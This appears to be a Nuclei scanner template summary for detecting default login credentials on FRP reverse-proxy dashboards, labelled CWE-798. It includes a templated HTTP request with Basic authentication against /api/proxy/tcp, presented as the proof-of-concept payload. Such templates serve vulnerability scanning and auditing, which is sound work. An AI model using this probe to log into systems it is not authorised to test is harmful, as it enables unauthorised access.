# Nuclei Template: FRP Default Login
**Template ID:** frp-default-login
**Vulnerability Class:** Use of Hard-coded Credentials
**Severity:** High
**CWE:** CWE-798
**Source:** Nuclei Template (`frp-default-login.yaml`)

## Vulnerability Information & PoC

## Description
FRP default login credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
GET /api/proxy/tcp HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username + ':' + password)}}
```

## References
- https://github.com/fatedier/frp/issues/1840
